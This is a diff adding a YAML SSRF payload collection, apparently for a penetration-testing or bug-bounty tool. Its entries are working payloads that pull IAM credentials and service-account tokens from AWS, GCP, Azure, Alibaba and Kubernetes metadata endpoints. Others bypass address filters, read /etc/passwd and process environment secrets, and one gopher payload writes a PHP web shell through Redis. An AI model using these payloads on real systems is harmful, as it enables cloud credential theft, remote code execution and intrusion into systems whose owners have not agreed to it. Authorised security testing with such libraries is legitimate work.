@@ -1,0 +1,307 @@
+id: ssrf
+name: Server-Side Request Forgery
+version: 1.0.0
+category: ssrf
+description: |
+  SSRF payloads targeting cloud metadata services (AWS / GCP / Azure / Alibaba
+  / DigitalOcean / Hetzner / Oracle), localhost and internal-network exposure,
+  filter bypasses using IPv6 / decimal-IP / 0.0.0.0 / DNS rebinding, and
+  protocol smuggling via gopher:// / dict:// / file://.
+mitre:
+  - T1190
+  - T1133  # external remote services
+  - T1078  # valid accounts via cloud metadata
+owasp_top10:
+  - A10:2021
+references:
+  - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
+  - https://portswigger.net/web-security/ssrf
+  - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
+  - https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html
+related_tools:
+  - ssrfmap
+  - gopherus
+  - nuclei
+  - jaeles
+  - interactsh_client
+chains:
+  - cloud_recon_aws
+  - bug_bounty_full_v2
+
+payloads:
+
+  # ---- AWS metadata (IMDSv1 + IMDSv2) ----
+  - id: ssrf_aws_imdsv1_role
+    name: AWS IMDSv1 role credentials
+    subcategory: cloud_metadata
+    encoding: raw
+    tech_targets: [aws]
+    severity_when_works: critical
+    payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+    notes: Returns role name; append the name to get temporary AKID/SAK/SessionToken.
+    source: AWS docs
+
+  - id: ssrf_aws_imdsv2_token
+    name: AWS IMDSv2 token request
+    subcategory: cloud_metadata
+    encoding: raw
+    tech_targets: [aws]
+    severity_when_works: critical
+    payload: "http://169.254.169.254/latest/api/token"
+    notes: Must be sent with PUT and header x-aws-ec2-metadata-token-ttl-seconds. Some SSRF tools allow header injection.
+    source: AWS docs
+
+  - id: ssrf_aws_account_id
+    name: AWS account ID via IMDS
+    subcategory: cloud_metadata
+    encoding: raw
+    tech_targets: [aws]
+    severity_when_works: high
+    payload: "http://169.254.169.254/latest/dynamic/instance-identity/document"
+    source: AWS docs
+
+  - id: ssrf_aws_userdata
+    name: AWS user-data leak
+    subcategory: cloud_metadata
+    encoding: raw
+    tech_targets: [aws]
+    severity_when_works: critical
+    payload: "http://169.254.169.254/latest/user-data"
+    notes: Often contains bootstrap scripts with secrets baked in.
+    source: AWS docs
+
+  # ---- GCP metadata ----
+  - id: ssrf_gcp_metadata_token
+    name: GCP service-account token
+    subcategory: cloud_metadata
+    encoding: raw
+    tech_targets: [gcp]
+    severity_when_works: critical
+    payload: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+    notes: "Needs header Metadata-Flavor: Google. Returns an OAuth access token."
+    source: GCP docs
+
+  - id: ssrf_gcp_project_id
+    name: GCP project ID
+    subcategory: cloud_metadata
+    encoding: raw
+    tech_targets: [gcp]
+    severity_when_works: high
+    payload: "http://metadata.google.internal/computeMetadata/v1/project/project-id"
+    source: GCP docs
+
+  # ---- Azure metadata ----
+  - id: ssrf_azure_imds_token
+    name: Azure IMDS managed-identity token
+    subcategory: cloud_metadata
+    encoding: raw
+    tech_targets: [azure]
+    severity_when_works: critical
+    payload: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+    notes: "Needs header Metadata: true."
+    source: Azure docs
+
+  - id: ssrf_azure_instance
+    name: Azure VM instance metadata
+    subcategory: cloud_metadata
+    encoding: raw
+    tech_targets: [azure]
+    severity_when_works: high
+    payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+    source: Azure docs
+
+  # ---- Other clouds ----
+  - id: ssrf_alibaba_ram
+    name: Alibaba Cloud RAM role
+    subcategory: cloud_metadata
+    encoding: raw
+    tech_targets: [alibaba_cloud]
+    severity_when_works: critical
+    payload: "http://100.100.100.200/latest/meta-data/ram/security-credentials/"
+    source: HackTricks SSRF
+
+  - id: ssrf_digitalocean_metadata
+    name: DigitalOcean droplet metadata
+    subcategory: cloud_metadata
+    encoding: raw
+    tech_targets: [digitalocean]
+    severity_when_works: high
+    payload: "http://169.254.169.254/metadata/v1.json"
+    source: DigitalOcean docs
+
+  - id: ssrf_oracle_cloud_metadata
+    name: Oracle Cloud Infrastructure metadata
+    subcategory: cloud_metadata
+    encoding: raw
+    tech_targets: [oci]
+    severity_when_works: high
+    payload: "http://169.254.169.254/opc/v2/instance/"
+    source: OCI docs
+
+  - id: ssrf_hetzner_metadata
+    name: Hetzner Cloud metadata
+    subcategory: cloud_metadata
+    encoding: raw
+    tech_targets: [hetzner_cloud]
+    severity_when_works: high
+    payload: "http://169.254.169.254/metadata/v1/network"
+    source: Hetzner docs
+
+  - id: ssrf_kubernetes_pod_metadata
+    name: Kubernetes pod service-account token
+    subcategory: cloud_metadata
+    encoding: raw
+    tech_targets: [kubernetes]
+    severity_when_works: critical
+    payload: "file:///var/run/secrets/kubernetes.io/serviceaccount/token"
+    notes: "When SSRF allows file:// — extracts the pod's bearer token for the kube-API."
+    source: K8s docs
+
+  # ---- Filter bypass — IPv4 ----
+  - id: ssrf_bypass_decimal_ip
+    name: Decimal-encoded loopback
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "http://2130706433/"
+    notes: 2130706433 = 127.0.0.1. Bypasses simple regex blocks.
+    source: HackTricks
+
+  - id: ssrf_bypass_octal_ip
+    name: Octal-encoded loopback
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "http://0177.0.0.1/"
+    source: HackTricks
+
+  - id: ssrf_bypass_hex_ip
+    name: Hex-encoded loopback
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "http://0x7f000001/"
+    source: HackTricks
+
+  - id: ssrf_bypass_zero_loopback
+    name: 0.0.0.0 loopback alias
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "http://0.0.0.0/"
+    source: HackTricks
+
+  - id: ssrf_bypass_imds_ip_alternate
+    name: "IMDS via [::ffff:169.254.169.254]"
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [aws]
+    severity_when_works: critical
+    payload: "http://[::ffff:169.254.169.254]/latest/meta-data/"
+    notes: IPv6-mapped form bypasses naive denylists checking 169.254.*.
+    source: HackTricks
+
+  - id: ssrf_bypass_imds_trailing_dot
+    name: IMDS with trailing dot
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [aws]
+    severity_when_works: critical
+    payload: "http://169.254.169.254./latest/meta-data/"
+    notes: Trailing dot in hostname passes through some host-header checks.
+    source: HackTricks
+
+  - id: ssrf_bypass_dns_rebinding
+    name: DNS rebinding service
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: critical
+    payload: "http://make-1.2.3.4-rebind-127.0.0.1-rr.7f000001.fingerprint.example/"
+    notes: Use a TOCTOU-aware DNS-rebind service to flip resolution between validation + fetch.
+    source: PortSwigger DNS rebinding
+
+  - id: ssrf_bypass_unicode_dot
+    name: Unicode full-stop in hostname
+    subcategory: filter_bypass
+    encoding: unicode
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: "http://169。254。169。254/latest/meta-data/"
+    notes: Some URL parsers treat U+3002 as a domain separator.
+    source: HackTricks
+
+  - id: ssrf_bypass_url_userinfo
+    name: User-info section trickery
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "http://victim.com@169.254.169.254/latest/meta-data/"
+    notes: Naive validators see victim.com host; URL libraries fetch from after @.
+    source: HackTricks
+
+  - id: ssrf_bypass_double_redirect
+    name: Open-redirect on trusted host
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "https://trusted.example/redirect?url=http://169.254.169.254/latest/meta-data/"
+    notes: When the SSRF target whitelists trusted.example but follows redirects.
+    source: PortSwigger
+
+  # ---- Protocol smuggling ----
+  - id: ssrf_gopher_redis
+    name: Gopher → Redis SLAVEOF
+    subcategory: protocol_smuggling
+    encoding: raw
+    tech_targets: [redis]
+    severity_when_works: critical
+    payload: "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$56%0d%0a%0a%0a<?php system($_GET[0]); ?>%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a"
+    notes: Write a PHP web shell into Redis DB; classic Redis RCE via SSRF.
+    source: ssrfmap / gopherus
+
+  - id: ssrf_dict_redis_info
+    name: "dict:// Redis INFO"
+    subcategory: protocol_smuggling
+    encoding: raw
+    tech_targets: [redis]
+    severity_when_works: high
+    payload: "dict://127.0.0.1:6379/info"
+    notes: Returns Redis INFO output via dict client.
+    source: PortSwigger
+
+  - id: ssrf_file_etc_passwd
+    name: "file:// local file read"
+    subcategory: protocol_smuggling
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "file:///etc/passwd"
+    source: common knowledge
+
+  - id: ssrf_file_proc_self_environ
+    name: "file:// process environment leak"
+    subcategory: protocol_smuggling
+    encoding: raw
+    tech_targets: [linux]
+    severity_when_works: high
+    payload: "file:///proc/self/environ"
+    notes: Leaks env vars — typically contains secrets (DATABASE_URL, AWS_*, etc.).
+    source: HackTricks
+
+  # ---- Blind / OOB ----
+  - id: ssrf_blind_interactsh
+    name: Blind SSRF via interactsh
+    subcategory: blind
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "http://{{interactsh}}.oast.online/probe"
+    notes: Confirm SSRF reachability by checking the interactsh server for the hit.
+    source: PD interactsh
